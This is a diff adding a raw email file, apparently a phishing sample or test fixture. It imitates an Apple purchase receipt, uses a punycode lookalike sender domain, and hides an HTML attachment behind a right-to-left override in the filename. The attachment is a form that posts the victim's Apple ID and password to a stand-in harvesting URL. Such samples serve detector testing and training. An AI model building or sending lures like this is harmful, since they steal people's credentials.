@@ -1,0 +1,29 @@
+Return-Path: <noreply@xn--pple-43d.example>
+Received: from relay.xn--pple-43d.example (relay.xn--pple-43d.example [192.0.2.77])
+	by mx.example.com with ESMTP id 7Zx1Qa9012
+	for <victim@example.com>; Thu, 14 Aug 2026 03:41:52 +0000
+From: "Apple ID" <noreply@xn--pple-43d.example>
+To: victim@example.com
+Subject: Your receipt from Apple
+Date: Sat, 01 Mar 2025 11:00:00 +0000
+Message-ID: <receipt-4471@relay.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b0undary42"
+
+--b0undary42
+Content-Type: text/plain; charset="utf-8"
+
+A payment of $499.00 was charged to your Apple ID. If you did not
+authorise this, open the attached form to cancel.
+
+--b0undary42
+Content-Type: text/html; name="invoice‮gnp.html"
+Content-Disposition: attachment; filename="invoice‮gnp.html"
+Content-Transfer-Encoding: 7bit
+
+<html><body><form action="http://collect.example/harvest" method="post">
+<input name="appleid"><input name="password" type="password">
+<input type="submit" value="Cancel payment">
+</form></body></html>
+
+--b0undary42--
